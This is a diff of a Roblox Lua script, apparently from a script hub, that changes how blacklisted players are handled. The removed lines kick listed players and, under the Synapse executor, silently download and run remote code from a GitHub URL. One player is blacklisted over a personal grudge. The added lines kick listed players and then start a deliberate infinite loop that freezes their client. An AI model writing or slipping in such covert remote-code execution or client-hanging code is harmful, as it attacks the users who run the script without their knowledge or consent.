@@ -8,40 +8,7 @@ getgenv().BLACKLIST_TABLE2 = {
 "abcd",
 }
 wait()
-if table.find(getgenv().BLACKLIST_TABLE, game.Players.LocalPlayer.UserId) then
-wait()
-game.Players.LocalPlayer:Kick("Auto blacklisted for suspicious activity, this blacklist was made with a bot. Join our discord server if this was a mistake.")
-if getgenv().sent == false then
-if syn then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub/main/Other%20Stuff/ssss", true))()
-end
-getgenv().sent = true
-end
-wait()
-elseif table.find(getgenv().BLACKLIST_TABLE2, game.Players.LocalPlayer.Name) then
-game.Players.LocalPlayer:Kick("Auto blacklisted for suspicious activity, this blacklist was made with a bot. Join our discord server if this was a mistake.")
-if getgenv().sent == false then
-if syn then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub/main/Other%20Stuff/ssss", true))()
-end
-getgenv().sent = true
-end
-wait()
-elseif table.find(getgenv().BLACKLIST_TABLE2, game.Players.LocalPlayer.Character.Name) then
-game.Players.LocalPlayer:Kick("Auto blacklisted for suspicious activity, this blacklist was made with a bot. Join our discord server if this was a mistake.")
-if getgenv().sent == false then
-if syn then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub/main/Other%20Stuff/ssss", true))()
-end
-getgenv().sent = true
-end
-wait()
-else
-end
-wait()
-if game.Players.LocalPlayer.UserId == 1516355505 then
-game.Players.LocalPlayer:Kick("BLACKLISTED CAUSE YOU KILLED ME 5 TIMES IN SL2")
-if syn then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub/main/Other%20Stuff/ssss", true))()
-end
-end
+if table.find(BLACKLIST_TABLE, game.Players.LocalPlayer.UserId) or table.find(BLACKLIST_TABLE2, game.Players.LocalPlayer.Name) or table.find(getgenv().BLACKLIST_TABLE2, game.Players.LocalPlayer.Character.Name) then
+game.Players.LocalPlayer:Kick("ur blacklisted buckaroo")
+task.wait(10)
+while true do end
